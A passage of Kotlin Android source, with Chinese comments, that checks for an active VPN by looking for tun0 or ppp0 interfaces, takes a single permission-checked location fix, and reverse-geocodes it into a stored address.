                if (networkInterface.isUp) networkList.add(networkInterface.name)
            }
            isVpn = networkList.contains("tun0") || networkList.contains("ppp0")
        } catch (ex: java.lang.Exception) {
            ex.printStackTrace()
        }
        return isVpn
    }


    private var addressDefault: Address? = null

    /**
     * 需要提前开启定位
     */
    fun locationPrepare() {
        if (ActivityCompat.checkSelfPermission(
                App.instance,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) return
        try {
            //1.获取位置管理器
            var locationManager =
                App.instance.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            //2.获取位置提供器，GPS或是NetWork
            var locationProvider: String? = null
            val providers = locationManager.getProviders(true)
            if (providers.contains(LocationManager.NETWORK_PROVIDER)) {
                //如果是网络定位
                locationProvider = LocationManager.NETWORK_PROVIDER
            } else if (providers.contains(LocationManager.GPS_PROVIDER)) {
                //如果是GPS定位
                locationProvider = LocationManager.GPS_PROVIDER
            }
            if (locationProvider == null) return
            locationManager.requestLocationUpdates(
                locationProvider,
                0,
                0f,
                object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        //dd
                        latitude = location.latitude
                        longitude = location.longitude
                        getAddress(location.latitude, location.longitude)
                        locationManager.removeUpdates(this)
                    }

                    override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {
                    }

                    override fun onProviderEnabled(provider: String) {
                    }

                    override fun onProviderDisabled(provider: String) {
                    }
                })
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
    }

    private fun getAddress(latitude: Double, longitude: Double) {
        //Geocoder通过经纬度获取具体信息
        val gc = Geocoder(App.instance, Locale.getDefault())
        try {
            val locationList = gc.getFromLocation(latitude, longitude, 1)
            if (locationList != null) {
                val address = locationList[0]
                addressDefault = address
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }


}